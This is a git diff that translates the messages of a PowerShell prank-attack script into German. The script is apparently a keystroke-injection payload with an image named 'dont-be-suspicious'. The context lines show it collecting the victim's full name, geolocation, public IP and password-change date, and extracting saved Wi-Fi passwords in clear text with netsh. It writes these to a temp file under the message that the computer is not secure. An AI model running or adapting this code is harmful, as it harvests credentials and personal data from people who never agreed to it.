@@ -48,7 +48,7 @@ $ImageName = "dont-be-suspicious"
 
     try {
 
-    $fullName = Net User $Env:username | Select-String -Pattern "Full Name";$fullName = ("$fullName").TrimStart("Full Name")
+    $fullName = Net User $Env:username | Select-String -Pattern "Vollständiger Name";$fullName = ("$fullName").TrimStart("Full Name")
 
     }
  
@@ -68,7 +68,7 @@ $fn = Get-Name
 
 echo "Hey" $fn >> $Env:temp\foo.txt
 
-echo "`nDein Computer ist nicht sehr sicher" >> $Env:temp\foo.txt
+echo "`nDein Computer ist nicht sehr sicher!" >> $Env:temp\foo.txt
 
 #############################################################################################################################################
 
@@ -92,7 +92,7 @@ function Get-GeoLocation{
 		Write-Error 'Access Denied for Location Information'
 	} else {
 		$GL = $GeoWatcher.Position.Location | Select Latitude,Longitude #Select the relevant results.
-		if ($GL) { echo "`nYDeine Position: `n$GL" >> $Env:temp\foo.txt }
+		if ($GL) { echo "`nDeine Position: `n$GL" >> $Env:temp\foo.txt }
 	}
 	}
     # Write Error is just for troubleshooting
@@ -136,7 +136,7 @@ function Get-PubIP {
 }
 
 $PubIP = Get-PubIP
-if ($PubIP) { echo "`ndDeine Oeffentliche IP: $PubIP" >> $Env:temp\foo.txt }
+if ($PubIP) { echo "`nDeine Oeffentliche IP: $PubIP" >> $Env:temp\foo.txt }
 
 
 ###########################################################################################################
@@ -157,7 +157,7 @@ if ($PubIP) { echo "`ndDeine Oeffentliche IP: $PubIP" >> $Env:temp\foo.txt }
 
     try {
  
-    $pls = net user $env:USERNAME | Select-String -Pattern "Password last" ; $pls = [string]$pls
+    $pls = net user $env:USERNAME | Select-String -Pattern "Letztes Setzen des Kennworts" ; $pls = [string]$pls
     $plsPOS = $pls.IndexOf("e")
     $pls = $pls.Substring($plsPOS+2).Trim()
     $pls = $pls -replace ".{3}$"
@@ -214,7 +214,7 @@ Foreach($WLANProfileName in $WLANProfileNames){
     try{
         $WLANProfilePassword = (((netsh.exe wlan show profiles name="$WLANProfileName" key=clear | select-string -Pattern "Schlüsselinhalt") -split ":")[1]).Trim()
     }Catch{
-        $WLANProfilePassword = "The password is not stored in this profile"
+        $WLANProfilePassword = "Das Passwort ist nicht in diesem Profil gespeichert"
     }
 
     #Build the object and add this to an array
